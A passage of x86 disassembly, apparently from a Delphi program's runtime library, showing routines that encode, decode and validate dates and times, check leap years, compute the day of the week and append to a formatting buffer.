  405628:	8b f0                	mov    %eax,%esi
  40562a:	8b c3                	mov    %ebx,%eax
  40562c:	e8 23 dc ff ff       	call   0x403254
  405631:	50                   	push   %eax
  405632:	57                   	push   %edi
  405633:	8b 45 08             	mov    0x8(%ebp),%eax
  405636:	50                   	push   %eax
  405637:	8b cb                	mov    %ebx,%ecx
  405639:	8d 85 fe ef ff ff    	lea    -0x1002(%ebp),%eax
  40563f:	ba 01 10 00 00       	mov    $0x1001,%edx
  405644:	e8 7b fc ff ff       	call   0x4052c4
  405649:	8b d8                	mov    %eax,%ebx
  40564b:	81 fb 01 10 00 00    	cmp    $0x1001,%ebx
  405651:	75 0a                	jne    0x40565d
  405653:	b8 a7 ff 00 00       	mov    $0xffa7,%eax
  405658:	e8 0b f6 ff ff       	call   0x404c68
  40565d:	8d 95 fe ef ff ff    	lea    -0x1002(%ebp),%edx
  405663:	8b c6                	mov    %esi,%eax
  405665:	8b cb                	mov    %ebx,%ecx
  405667:	e8 54 db ff ff       	call   0x4031c0
  40566c:	5f                   	pop    %edi
  40566d:	5e                   	pop    %esi
  40566e:	5b                   	pop    %ebx
  40566f:	8b e5                	mov    %ebp,%esp
  405671:	5d                   	pop    %ebp
  405672:	c2 04 00             	ret    $0x4
  405675:	8d 40 00             	lea    0x0(%eax),%eax
  405678:	55                   	push   %ebp
  405679:	8b ec                	mov    %esp,%ebp
  40567b:	89 c1                	mov    %eax,%ecx
  40567d:	dd 45 08             	fldl   0x8(%ebp)
  405680:	d8 0d a0 b0 40 00    	fmuls  0x40b0a0
  405686:	83 ec 08             	sub    $0x8,%esp
  405689:	df 3c 24             	fistpll (%esp)
  40568c:	9b                   	fwait
  40568d:	58                   	pop    %eax
  40568e:	5a                   	pop    %edx
  40568f:	09 d2                	or     %edx,%edx
  405691:	79 11                	jns    0x4056a4
  405693:	f7 da                	neg    %edx
  405695:	f7 d8                	neg    %eax
  405697:	83 da 00             	sbb    $0x0,%edx
  40569a:	f7 35 a4 b0 40 00    	divl   0x40b0a4
  4056a0:	f7 d8                	neg    %eax
  4056a2:	eb 06                	jmp    0x4056aa
  4056a4:	f7 35 a4 b0 40 00    	divl   0x40b0a4
  4056aa:	05 5a 95 0a 00       	add    $0xa955a,%eax
  4056af:	89 11                	mov    %edx,(%ecx)
  4056b1:	89 41 04             	mov    %eax,0x4(%ecx)
  4056b4:	5d                   	pop    %ebp
  4056b5:	c2 08 00             	ret    $0x8
  4056b8:	55                   	push   %ebp
  4056b9:	8b ec                	mov    %esp,%ebp
  4056bb:	83 c4 f8             	add    $0xfffffff8,%esp
  4056be:	56                   	push   %esi
  4056bf:	8b 75 0c             	mov    0xc(%ebp),%esi
  4056c2:	c6 45 ff 00          	movb   $0x0,-0x1(%ebp)
  4056c6:	66 83 f8 18          	cmp    $0x18,%ax
  4056ca:	73 4f                	jae    0x40571b
  4056cc:	66 83 fa 3c          	cmp    $0x3c,%dx
  4056d0:	73 49                	jae    0x40571b
  4056d2:	66 83 f9 3c          	cmp    $0x3c,%cx
  4056d6:	73 43                	jae    0x40571b
  4056d8:	66 81 fe e8 03       	cmp    $0x3e8,%si
  4056dd:	73 3c                	jae    0x40571b
  4056df:	0f b7 c0             	movzwl %ax,%eax
  4056e2:	69 c0 80 ee 36 00    	imul   $0x36ee80,%eax,%eax
  4056e8:	0f b7 d2             	movzwl %dx,%edx
  4056eb:	69 d2 60 ea 00 00    	imul   $0xea60,%edx,%edx
  4056f1:	03 c2                	add    %edx,%eax
  4056f3:	0f b7 d1             	movzwl %cx,%edx
  4056f6:	69 d2 e8 03 00 00    	imul   $0x3e8,%edx,%edx
  4056fc:	03 c2                	add    %edx,%eax
  4056fe:	0f b7 d6             	movzwl %si,%edx
  405701:	03 c2                	add    %edx,%eax
  405703:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405706:	db 45 f8             	fildl  -0x8(%ebp)
  405709:	db 2d 28 57 40 00    	fldt   0x405728
  40570f:	de c9                	fmulp  %st,%st(1)
  405711:	8b 45 08             	mov    0x8(%ebp),%eax
  405714:	dd 18                	fstpl  (%eax)
  405716:	9b                   	fwait
  405717:	c6 45 ff 01          	movb   $0x1,-0x1(%ebp)
  40571b:	8a 45 ff             	mov    -0x1(%ebp),%al
  40571e:	5e                   	pop    %esi
  40571f:	59                   	pop    %ecx
  405720:	59                   	pop    %ecx
  405721:	5d                   	pop    %ebp
  405722:	c2 08 00             	ret    $0x8
  405725:	00 00                	add    %al,(%eax)
  405727:	00 0d b9 67 fa eb    	add    %cl,0xebfa67b9
  40572d:	50                   	push   %eax
  40572e:	d7                   	xlat   %ds:(%ebx)
  40572f:	c6                   	(bad)
  405730:	e4 3f                	in     $0x3f,%al
  405732:	00 00                	add    %al,(%eax)
  405734:	55                   	push   %ebp
  405735:	8b ec                	mov    %esp,%ebp
  405737:	83 c4 f8             	add    $0xfffffff8,%esp
  40573a:	53                   	push   %ebx
  40573b:	56                   	push   %esi
  40573c:	57                   	push   %edi
  40573d:	8b f9                	mov    %ecx,%edi
  40573f:	8b f2                	mov    %edx,%esi
  405741:	8b d8                	mov    %eax,%ebx
  405743:	66 8b 45 08          	mov    0x8(%ebp),%ax
  405747:	50                   	push   %eax
  405748:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40574b:	50                   	push   %eax
  40574c:	8b cf                	mov    %edi,%ecx
  40574e:	8b d6                	mov    %esi,%edx
  405750:	8b c3                	mov    %ebx,%eax
  405752:	e8 61 ff ff ff       	call   0x4056b8
  405757:	84 c0                	test   %al,%al
  405759:	75 0a                	jne    0x405765
  40575b:	b8 85 ff 00 00       	mov    $0xff85,%eax
  405760:	e8 03 f5 ff ff       	call   0x404c68
  405765:	dd 45 f8             	fldl   -0x8(%ebp)
  405768:	5f                   	pop    %edi
  405769:	5e                   	pop    %esi
  40576a:	5b                   	pop    %ebx
  40576b:	59                   	pop    %ecx
  40576c:	59                   	pop    %ecx
  40576d:	5d                   	pop    %ebp
  40576e:	c2 04 00             	ret    $0x4
  405771:	8d 40 00             	lea    0x0(%eax),%eax
  405774:	55                   	push   %ebp
  405775:	8b ec                	mov    %esp,%ebp
  405777:	83 c4 f4             	add    $0xfffffff4,%esp
  40577a:	53                   	push   %ebx
  40577b:	56                   	push   %esi
  40577c:	57                   	push   %edi
  40577d:	8b f9                	mov    %ecx,%edi
  40577f:	8b f2                	mov    %edx,%esi
  405781:	8b d8                	mov    %eax,%ebx
  405783:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405786:	50                   	push   %eax
  405787:	ff 75 10             	push   0x10(%ebp)
  40578a:	ff 75 0c             	push   0xc(%ebp)
  40578d:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405790:	e8 e3 fe ff ff       	call   0x405678
  405795:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405798:	8d 4d fe             	lea    -0x2(%ebp),%ecx
  40579b:	66 ba 60 ea          	mov    $0xea60,%dx
  40579f:	e8 a8 f4 ff ff       	call   0x404c4c
  4057a4:	56                   	push   %esi
  4057a5:	8b cb                	mov    %ebx,%ecx
  4057a7:	0f b7 45 fe          	movzwl -0x2(%ebp),%eax
  4057ab:	66 ba 3c 00          	mov    $0x3c,%dx
  4057af:	e8 98 f4 ff ff       	call   0x404c4c
  4057b4:	8b 45 08             	mov    0x8(%ebp),%eax
  4057b7:	50                   	push   %eax
  4057b8:	8b cf                	mov    %edi,%ecx
  4057ba:	0f b7 45 fc          	movzwl -0x4(%ebp),%eax
  4057be:	66 ba e8 03          	mov    $0x3e8,%dx
  4057c2:	e8 85 f4 ff ff       	call   0x404c4c
  4057c7:	5f                   	pop    %edi
  4057c8:	5e                   	pop    %esi
  4057c9:	5b                   	pop    %ebx
  4057ca:	8b e5                	mov    %ebp,%esp
  4057cc:	5d                   	pop    %ebp
  4057cd:	c2 0c 00             	ret    $0xc
  4057d0:	53                   	push   %ebx
  4057d1:	56                   	push   %esi
  4057d2:	8b c8                	mov    %eax,%ecx
  4057d4:	0f b7 c1             	movzwl %cx,%eax
  4057d7:	25 03 00 00 80       	and    $0x80000003,%eax
  4057dc:	79 05                	jns    0x4057e3
  4057de:	48                   	dec    %eax
  4057df:	83 c8 fc             	or     $0xfffffffc,%eax
  4057e2:	40                   	inc    %eax
  4057e3:	85 c0                	test   %eax,%eax
  4057e5:	75 1f                	jne    0x405806
  4057e7:	0f b7 d9             	movzwl %cx,%ebx
  4057ea:	8b c3                	mov    %ebx,%eax
  4057ec:	be 64 00 00 00       	mov    $0x64,%esi
  4057f1:	99                   	cltd
  4057f2:	f7 fe                	idiv   %esi
  4057f4:	85 d2                	test   %edx,%edx
  4057f6:	75 13                	jne    0x40580b
  4057f8:	8b c3                	mov    %ebx,%eax
  4057fa:	b9 90 01 00 00       	mov    $0x190,%ecx
  4057ff:	99                   	cltd
  405800:	f7 f9                	idiv   %ecx
  405802:	85 d2                	test   %edx,%edx
  405804:	74 05                	je     0x40580b
  405806:	33 c0                	xor    %eax,%eax
  405808:	5e                   	pop    %esi
  405809:	5b                   	pop    %ebx
  40580a:	c3                   	ret
  40580b:	b0 01                	mov    $0x1,%al
  40580d:	5e                   	pop    %esi
  40580e:	5b                   	pop    %ebx
  40580f:	c3                   	ret
  405810:	53                   	push   %ebx
  405811:	8b d8                	mov    %eax,%ebx
  405813:	8b c3                	mov    %ebx,%eax
  405815:	e8 b6 ff ff ff       	call   0x4057d0
  40581a:	83 e0 7f             	and    $0x7f,%eax
  40581d:	8b 04 85 d8 b0 40 00 	mov    0x40b0d8(,%eax,4),%eax
  405824:	5b                   	pop    %ebx
  405825:	c3                   	ret
  405826:	8b c0                	mov    %eax,%eax
  405828:	55                   	push   %ebp
  405829:	8b ec                	mov    %esp,%ebp
  40582b:	83 c4 f8             	add    $0xfffffff8,%esp
  40582e:	53                   	push   %ebx
  40582f:	56                   	push   %esi
  405830:	57                   	push   %edi
  405831:	8b d9                	mov    %ecx,%ebx
  405833:	8b fa                	mov    %edx,%edi
  405835:	66 89 45 fe          	mov    %ax,-0x2(%ebp)
  405839:	c6 45 fd 00          	movb   $0x0,-0x3(%ebp)
  40583d:	66 8b 45 fe          	mov    -0x2(%ebp),%ax
  405841:	e8 ca ff ff ff       	call   0x405810
  405846:	8b f0                	mov    %eax,%esi
  405848:	66 83 7d fe 01       	cmpw   $0x1,-0x2(%ebp)
  40584d:	0f 82 86 00 00 00    	jb     0x4058d9
  405853:	66 81 7d fe 0f 27    	cmpw   $0x270f,-0x2(%ebp)
  405859:	77 7e                	ja     0x4058d9
  40585b:	66 83 ff 01          	cmp    $0x1,%di
  40585f:	72 78                	jb     0x4058d9
  405861:	66 83 ff 0c          	cmp    $0xc,%di
  405865:	77 72                	ja     0x4058d9
  405867:	66 83 fb 01          	cmp    $0x1,%bx
  40586b:	72 6c                	jb     0x4058d9
  40586d:	0f b7 c7             	movzwl %di,%eax
  405870:	66 3b 5c 46 fe       	cmp    -0x2(%esi,%eax,2),%bx
  405875:	77 62                	ja     0x4058d9
  405877:	0f b7 c7             	movzwl %di,%eax
  40587a:	48                   	dec    %eax
  40587b:	85 c0                	test   %eax,%eax
  40587d:	7e 0e                	jle    0x40588d
  40587f:	b9 01 00 00 00       	mov    $0x1,%ecx
  405884:	66 03 5c 4e fe       	add    -0x2(%esi,%ecx,2),%bx
  405889:	41                   	inc    %ecx
  40588a:	48                   	dec    %eax
  40588b:	75 f7                	jne    0x405884
  40588d:	0f b7 4d fe          	movzwl -0x2(%ebp),%ecx
  405891:	49                   	dec    %ecx
  405892:	8b c1                	mov    %ecx,%eax
  405894:	be 64 00 00 00       	mov    $0x64,%esi
  405899:	99                   	cltd
  40589a:	f7 fe                	idiv   %esi
  40589c:	69 f1 6d 01 00 00    	imul   $0x16d,%ecx,%esi
  4058a2:	8b d1                	mov    %ecx,%edx
  4058a4:	85 d2                	test   %edx,%edx
  4058a6:	79 03                	jns    0x4058ab
  4058a8:	83 c2 03             	add    $0x3,%edx
  4058ab:	c1 fa 02             	sar    $0x2,%edx
  4058ae:	03 f2                	add    %edx,%esi
  4058b0:	2b f0                	sub    %eax,%esi
  4058b2:	8b c1                	mov    %ecx,%eax
  4058b4:	b9 90 01 00 00       	mov    $0x190,%ecx
  4058b9:	99                   	cltd
  4058ba:	f7 f9                	idiv   %ecx
  4058bc:	03 f0                	add    %eax,%esi
  4058be:	0f b7 c3             	movzwl %bx,%eax
  4058c1:	03 f0                	add    %eax,%esi
  4058c3:	81 ee 5a 95 0a 00    	sub    $0xa955a,%esi
  4058c9:	89 75 f8             	mov    %esi,-0x8(%ebp)
  4058cc:	db 45 f8             	fildl  -0x8(%ebp)
  4058cf:	8b 45 08             	mov    0x8(%ebp),%eax
  4058d2:	dd 18                	fstpl  (%eax)
  4058d4:	9b                   	fwait
  4058d5:	c6 45 fd 01          	movb   $0x1,-0x3(%ebp)
  4058d9:	8a 45 fd             	mov    -0x3(%ebp),%al
  4058dc:	5f                   	pop    %edi
  4058dd:	5e                   	pop    %esi
  4058de:	5b                   	pop    %ebx
  4058df:	59                   	pop    %ecx
  4058e0:	59                   	pop    %ecx
  4058e1:	5d                   	pop    %ebp
  4058e2:	c2 04 00             	ret    $0x4
  4058e5:	8d 40 00             	lea    0x0(%eax),%eax
  4058e8:	53                   	push   %ebx
  4058e9:	56                   	push   %esi
  4058ea:	57                   	push   %edi
  4058eb:	83 c4 f8             	add    $0xfffffff8,%esp
  4058ee:	8b f9                	mov    %ecx,%edi
  4058f0:	8b f2                	mov    %edx,%esi
  4058f2:	8b d8                	mov    %eax,%ebx
  4058f4:	54                   	push   %esp
  4058f5:	8b cf                	mov    %edi,%ecx
  4058f7:	8b d6                	mov    %esi,%edx
  4058f9:	8b c3                	mov    %ebx,%eax
  4058fb:	e8 28 ff ff ff       	call   0x405828
  405900:	84 c0                	test   %al,%al
  405902:	75 0a                	jne    0x40590e
  405904:	b8 86 ff 00 00       	mov    $0xff86,%eax
  405909:	e8 5a f3 ff ff       	call   0x404c68
  40590e:	dd 04 24             	fldl   (%esp)
  405911:	59                   	pop    %ecx
  405912:	5a                   	pop    %edx
  405913:	5f                   	pop    %edi
  405914:	5e                   	pop    %esi
  405915:	5b                   	pop    %ebx
  405916:	c3                   	ret
  405917:	90                   	nop
  405918:	55                   	push   %ebp
  405919:	8b ec                	mov    %esp,%ebp
  40591b:	83 c4 ec             	add    $0xffffffec,%esp
  40591e:	53                   	push   %ebx
  40591f:	56                   	push   %esi
  405920:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  405923:	89 55 fc             	mov    %edx,-0x4(%ebp)
  405926:	8b f0                	mov    %eax,%esi
  405928:	ff 75 0c             	push   0xc(%ebp)
  40592b:	ff 75 08             	push   0x8(%ebp)
  40592e:	8d 45 ec             	lea    -0x14(%ebp),%eax
  405931:	e8 42 fd ff ff       	call   0x405678
  405936:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405939:	85 c0                	test   %eax,%eax
  40593b:	7f 1a                	jg     0x405957
  40593d:	66 c7 06 00 00       	movw   $0x0,(%esi)
  405942:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405945:	66 c7 00 00 00       	movw   $0x0,(%eax)
  40594a:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40594d:	66 c7 00 00 00       	movw   $0x0,(%eax)
  405952:	e9 cf 00 00 00       	jmp    0x405a26
  405957:	48                   	dec    %eax
  405958:	66 bb 01 00          	mov    $0x1,%bx
  40595c:	3d b1 3a 02 00       	cmp    $0x23ab1,%eax
  405961:	7c 11                	jl     0x405974
  405963:	2d b1 3a 02 00       	sub    $0x23ab1,%eax
  405968:	66 81 c3 90 01       	add    $0x190,%bx
  40596d:	3d b1 3a 02 00       	cmp    $0x23ab1,%eax
  405972:	7d ef                	jge    0x405963
  405974:	8d 55 f6             	lea    -0xa(%ebp),%edx
  405977:	52                   	push   %edx
  405978:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  40597b:	66 ba ac 8e          	mov    $0x8eac,%dx
  40597f:	e8 c8 f2 ff ff       	call   0x404c4c
  405984:	66 83 7d f4 04       	cmpw   $0x4,-0xc(%ebp)
  405989:	75 0a                	jne    0x405995
  40598b:	66 ff 4d f4          	decw   -0xc(%ebp)
  40598f:	66 81 45 f6 ac 8e    	addw   $0x8eac,-0xa(%ebp)
  405995:	66 6b 45 f4 64       	imul   $0x64,-0xc(%ebp),%ax
  40599a:	66 03 d8             	add    %ax,%bx
  40599d:	8d 45 f6             	lea    -0xa(%ebp),%eax
  4059a0:	50                   	push   %eax
  4059a1:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4059a4:	0f b7 45 f6          	movzwl -0xa(%ebp),%eax
  4059a8:	66 ba b5 05          	mov    $0x5b5,%dx
  4059ac:	e8 9b f2 ff ff       	call   0x404c4c
  4059b1:	66 8b 45 f4          	mov    -0xc(%ebp),%ax
  4059b5:	c1 e0 02             	shl    $0x2,%eax
  4059b8:	66 03 d8             	add    %ax,%bx
  4059bb:	8d 45 f6             	lea    -0xa(%ebp),%eax
  4059be:	50                   	push   %eax
  4059bf:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4059c2:	0f b7 45 f6          	movzwl -0xa(%ebp),%eax
  4059c6:	66 ba 6d 01          	mov    $0x16d,%dx
  4059ca:	e8 7d f2 ff ff       	call   0x404c4c
  4059cf:	66 83 7d f4 04       	cmpw   $0x4,-0xc(%ebp)
  4059d4:	75 0a                	jne    0x4059e0
  4059d6:	66 ff 4d f4          	decw   -0xc(%ebp)
  4059da:	66 81 45 f6 6d 01    	addw   $0x16d,-0xa(%ebp)
  4059e0:	66 03 5d f4          	add    -0xc(%ebp),%bx
  4059e4:	8b c3                	mov    %ebx,%eax
  4059e6:	e8 25 fe ff ff       	call   0x405810
  4059eb:	8b d0                	mov    %eax,%edx
  4059ed:	66 b8 01 00          	mov    $0x1,%ax
  4059f1:	0f b7 c8             	movzwl %ax,%ecx
  4059f4:	66 8b 4c 4a fe       	mov    -0x2(%edx,%ecx,2),%cx
  4059f9:	66 89 4d f4          	mov    %cx,-0xc(%ebp)
  4059fd:	66 8b 4d f6          	mov    -0xa(%ebp),%cx
  405a01:	66 3b 4d f4          	cmp    -0xc(%ebp),%cx
  405a05:	72 0b                	jb     0x405a12
  405a07:	66 8b 4d f4          	mov    -0xc(%ebp),%cx
  405a0b:	66 29 4d f6          	sub    %cx,-0xa(%ebp)
  405a0f:	40                   	inc    %eax
  405a10:	eb df                	jmp    0x4059f1
  405a12:	66 89 1e             	mov    %bx,(%esi)
  405a15:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405a18:	66 89 02             	mov    %ax,(%edx)
  405a1b:	66 8b 45 f6          	mov    -0xa(%ebp),%ax
  405a1f:	40                   	inc    %eax
  405a20:	8b 55 f8             	mov    -0x8(%ebp),%edx
  405a23:	66 89 02             	mov    %ax,(%edx)
  405a26:	5e                   	pop    %esi
  405a27:	5b                   	pop    %ebx
  405a28:	8b e5                	mov    %ebp,%esp
  405a2a:	5d                   	pop    %ebp
  405a2b:	c2 08 00             	ret    $0x8
  405a2e:	8b c0                	mov    %eax,%eax
  405a30:	55                   	push   %ebp
  405a31:	8b ec                	mov    %esp,%ebp
  405a33:	83 c4 f8             	add    $0xfffffff8,%esp
  405a36:	ff 75 0c             	push   0xc(%ebp)
  405a39:	ff 75 08             	push   0x8(%ebp)
  405a3c:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405a3f:	e8 34 fc ff ff       	call   0x405678
  405a44:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405a47:	b9 07 00 00 00       	mov    $0x7,%ecx
  405a4c:	99                   	cltd
  405a4d:	f7 f9                	idiv   %ecx
  405a4f:	8b c2                	mov    %edx,%eax
  405a51:	40                   	inc    %eax
  405a52:	59                   	pop    %ecx
  405a53:	59                   	pop    %ecx
  405a54:	5d                   	pop    %ebp
  405a55:	c2 08 00             	ret    $0x8
  405a58:	83 c4 e8             	add    $0xffffffe8,%esp
  405a5b:	8d 44 24 08          	lea    0x8(%esp),%eax
  405a5f:	50                   	push   %eax
  405a60:	e8 df eb ff ff       	call   0x404644
  405a65:	66 8b 4c 24 0e       	mov    0xe(%esp),%cx
  405a6a:	66 8b 54 24 0a       	mov    0xa(%esp),%dx
  405a6f:	66 8b 44 24 08       	mov    0x8(%esp),%ax
  405a74:	e8 6f fe ff ff       	call   0x4058e8
  405a79:	dd 1c 24             	fstpl  (%esp)
  405a7c:	9b dd 04 24          	fldl   (%esp)
  405a80:	83 c4 18             	add    $0x18,%esp
  405a83:	c3                   	ret
  405a84:	83 c4 e8             	add    $0xffffffe8,%esp
  405a87:	8d 44 24 08          	lea    0x8(%esp),%eax
  405a8b:	50                   	push   %eax
  405a8c:	e8 b3 eb ff ff       	call   0x404644
  405a91:	66 8b 44 24 16       	mov    0x16(%esp),%ax
  405a96:	50                   	push   %eax
  405a97:	66 8b 4c 24 18       	mov    0x18(%esp),%cx
  405a9c:	66 8b 54 24 16       	mov    0x16(%esp),%dx
  405aa1:	66 8b 44 24 14       	mov    0x14(%esp),%ax
  405aa6:	e8 89 fc ff ff       	call   0x405734
  405aab:	dd 1c 24             	fstpl  (%esp)
  405aae:	9b dd 04 24          	fldl   (%esp)
  405ab2:	83 c4 18             	add    $0x18,%esp
  405ab5:	c3                   	ret
  405ab6:	8b c0                	mov    %eax,%eax
  405ab8:	83 c4 f0             	add    $0xfffffff0,%esp
  405abb:	e8 98 ff ff ff       	call   0x405a58
  405ac0:	dd 5c 24 08          	fstpl  0x8(%esp)
  405ac4:	9b                   	fwait
  405ac5:	e8 ba ff ff ff       	call   0x405a84
  405aca:	dc 44 24 08          	faddl  0x8(%esp)
  405ace:	dd 1c 24             	fstpl  (%esp)
  405ad1:	9b dd 04 24          	fldl   (%esp)
  405ad5:	83 c4 10             	add    $0x10,%esp
  405ad8:	c3                   	ret
  405ad9:	8d 40 00             	lea    0x0(%eax),%eax
  405adc:	55                   	push   %ebp
  405add:	8b ec                	mov    %esp,%ebp
  405adf:	53                   	push   %ebx
  405ae0:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405ae3:	bb 00 01 00 00       	mov    $0x100,%ebx
  405ae8:	2b 99 fc fe ff ff    	sub    -0x104(%ecx),%ebx
  405aee:	3b d3                	cmp    %ebx,%edx
  405af0:	7d 02                	jge    0x405af4
  405af2:	8b da                	mov    %edx,%ebx
  405af4:	85 db                	test   %ebx,%ebx
  405af6:	74 1a                	je     0x405b12
  405af8:	8b 55 08             	mov    0x8(%ebp),%edx
  405afb:	8b 92 fc fe ff ff    	mov    -0x104(%edx),%edx
  405b01:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405b04:	8d 94 11 00 ff ff ff 	lea    -0x100(%ecx,%edx,1),%edx
  405b0b:	8b cb                	mov    %ebx,%ecx
  405b0d:	e8 b6 cb ff ff       	call   0x4026c8
  405b12:	8b 45 08             	mov    0x8(%ebp),%eax
  405b15:	01 98 fc fe ff ff    	add    %ebx,-0x104(%eax)
  405b1b:	5b                   	pop    %ebx
  405b1c:	5d                   	pop    %ebp
  405b1d:	c3                   	ret
  405b1e:	8b c0                	mov    %eax,%eax
  405b20:	55                   	push   %ebp
  405b21:	8b ec                	mov    %esp,%ebp
  405b23:	53                   	push   %ebx
  405b24:	8b d8                	mov    %eax,%ebx
  405b26:	8b 45 08             	mov    0x8(%ebp),%eax
  405b29:	50                   	push   %eax
  405b2a:	8b c3                	mov    %ebx,%eax
  405b2c:	e8 23 d7 ff ff       	call   0x403254
  405b31:	8b d0                	mov    %eax,%edx
  405b33:	8b c3                	mov    %ebx,%eax
  405b35:	e8 a2 ff ff ff       	call   0x405adc
  405b3a:	59                   	pop    %ecx
  405b3b:	5b                   	pop    %ebx
  405b3c:	5d                   	pop    %ebp
  405b3d:	c3                   	ret
  405b3e:	8b c0                	mov    %eax,%eax
  405b40:	55                   	push   %ebp
  405b41:	8b ec                	mov    %esp,%ebp
  405b43:	83 c4 e0             	add    $0xffffffe0,%esp
  405b46:	53                   	push   %ebx
  405b47:	56                   	push   %esi
  405b48:	8b f2                	mov    %edx,%esi
  405b4a:	8b d8                	mov    %eax,%ebx
  405b4c:	8b 45 08             	mov    0x8(%ebp),%eax
  405b4f:	50                   	push   %eax
  405b50:	6a 04                	push   $0x4
  405b52:	89 75 e0             	mov    %esi,-0x20(%ebp)
  405b55:	c6 45 e4 00          	movb   $0x0,-0x1c(%ebp)
  405b59:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  405b5c:	c6 45 ec 00          	movb   $0x0,-0x14(%ebp)
  405b60:	8d 45 e0             	lea    -0x20(%ebp),%eax
  405b63:	50                   	push   %eax
  405b64:	6a 01                	push   $0x1
  405b66:	b9 e0 b0 40 00       	mov    $0x40b0e0,%ecx
  405b6b:	8d 45 f0             	lea    -0x10(%ebp),%eax
  405b6e:	ba 10 00 00 00       	mov    $0x10,%edx
  405b73:	e8 4c f7 ff ff       	call   0x4052c4
  405b78:	8b d0                	mov    %eax,%edx
  405b7a:	8d 45 f0             	lea    -0x10(%ebp),%eax
  405b7d:	e8 5a ff ff ff       	call   0x405adc
  405b82:	59                   	pop    %ecx
  405b83:	5e                   	pop    %esi
  405b84:	5b                   	pop    %ebx
  405b85:	8b e5                	mov    %ebp,%esp
  405b87:	5d                   	pop    %ebp
  405b88:	c3                   	ret
  405b89:	8d 40 00             	lea    0x0(%eax),%eax
  405b8c:	55                   	push   %ebp
  405b8d:	8b ec                	mov    %esp,%ebp
  405b8f:	53                   	push   %ebx
  405b90:	8b 45 08             	mov    0x8(%ebp),%eax
  405b93:	83 c0 fc             	add    $0xfffffffc,%eax
  405b96:	8b 10                	mov    (%eax),%edx
  405b98:	eb 02                	jmp    0x405b9c
  405b9a:	ff 00                	incl   (%eax)
  405b9c:	8b 08                	mov    (%eax),%ecx
  405b9e:	8a 09                	mov    (%ecx),%cl
  405ba0:	8b 5d 08             	mov    0x8(%ebp),%ebx
  405ba3:	3a 4b fb             	cmp    -0x5(%ebx),%cl
  405ba6:	74 f2                	je     0x405b9a
  405ba8:	8b 00                	mov    (%eax),%eax
  405baa:	2b c2                	sub    %edx,%eax
  405bac:	40                   	inc    %eax
  405bad:	8b 55 08             	mov    0x8(%ebp),%edx
  405bb0:	89 42 f4             	mov    %eax,-0xc(%edx)
  405bb3:	5b                   	pop    %ebx
  405bb4:	5d                   	pop    %ebp
  405bb5:	c3                   	ret
  405bb6:	8b c0                	mov    %eax,%eax
  405bb8:	55                   	push   %ebp
  405bb9:	8b ec                	mov    %esp,%ebp
  405bbb:	8b 45 08             	mov    0x8(%ebp),%eax
  405bbe:	80 78 ed 00          	cmpb   $0x0,-0x13(%eax)
  405bc2:	75 2a                	jne    0x405bee
  405bc4:	8b 45 08             	mov    0x8(%ebp),%eax
  405bc7:	8b 40 08             	mov    0x8(%eax),%eax
  405bca:	ff 70 0c             	push   0xc(%eax)
  405bcd:	ff 70 08             	push   0x8(%eax)
  405bd0:	8b 45 08             	mov    0x8(%ebp),%eax
  405bd3:	8d 48 ee             	lea    -0x12(%eax),%ecx
  405bd6:	8b 45 08             	mov    0x8(%ebp),%eax
  405bd9:	8d 50 f0             	lea    -0x10(%eax),%edx
  405bdc:	8b 45 08             	mov    0x8(%ebp),%eax
  405bdf:	83 c0 f2             	add    $0xfffffff2,%eax
  405be2:	e8 31 fd ff ff       	call   0x405918
  405be7:	8b 45 08             	mov    0x8(%ebp),%eax
  405bea:	c6 40 ed 01          	movb   $0x1,-0x13(%eax)
  405bee:	5d                   	pop    %ebp
  405bef:	c3                   	ret
  405bf0:	55                   	push   %ebp
  405bf1:	8b ec                	mov    %esp,%ebp
  405bf3:	8b 45 08             	mov    0x8(%ebp),%eax
  405bf6:	80 78 e3 00          	cmpb   $0x0,-0x1d(%eax)
  405bfa:	75 31                	jne    0x405c2d
  405bfc:	8b 45 08             	mov    0x8(%ebp),%eax
  405bff:	8b 40 08             	mov    0x8(%eax),%eax
  405c02:	ff 70 0c             	push   0xc(%eax)
  405c05:	ff 70 08             	push   0x8(%eax)
  405c08:	8b 45 08             	mov    0x8(%ebp),%eax
  405c0b:	83 c0 e4             	add    $0xffffffe4,%eax
  405c0e:	50                   	push   %eax
  405c0f:	8b 45 08             	mov    0x8(%ebp),%eax
  405c12:	8d 48 e6             	lea    -0x1a(%eax),%ecx
  405c15:	8b 45 08             	mov    0x8(%ebp),%eax
  405c18:	8d 50 e8             	lea    -0x18(%eax),%edx
  405c1b:	8b 45 08             	mov    0x8(%ebp),%eax
  405c1e:	83 c0 ea             	add    $0xffffffea,%eax
  405c21:	e8 4e fb ff ff       	call   0x405774
  405c26:	8b 45 08             	mov    0x8(%ebp),%eax
  405c29:	c6 40 e3 01          	movb   $0x1,-0x1d(%eax)
  405c2d:	5d                   	pop    %ebp
  405c2e:	c3                   	ret
  405c2f:	90                   	nop
  405c30:	55                   	push   %ebp
  405c31:	8b ec                	mov    %esp,%ebp
  405c33:	83 c4 e0             	add    $0xffffffe0,%esp
  405c36:	53                   	push   %ebx
  405c37:	56                   	push   %esi
  405c38:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405c3b:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  405c3f:	0f 84 22 05 00 00    	je     0x406167
  405c45:	8b 45 08             	mov    0x8(%ebp),%eax
  405c48:	83 b8 f8 fe ff ff 02 	cmpl   $0x2,-0x108(%eax)
  405c4f:	0f 8d 12 05 00 00    	jge    0x406167
  405c55:	8b 45 08             	mov    0x8(%ebp),%eax
  405c58:	ff 80 f8 fe ff ff    	incl   -0x108(%eax)
  405c5e:	b3 20                	mov    $0x20,%bl
  405c60:	c6 45 ed 00          	movb   $0x0,-0x13(%ebp)
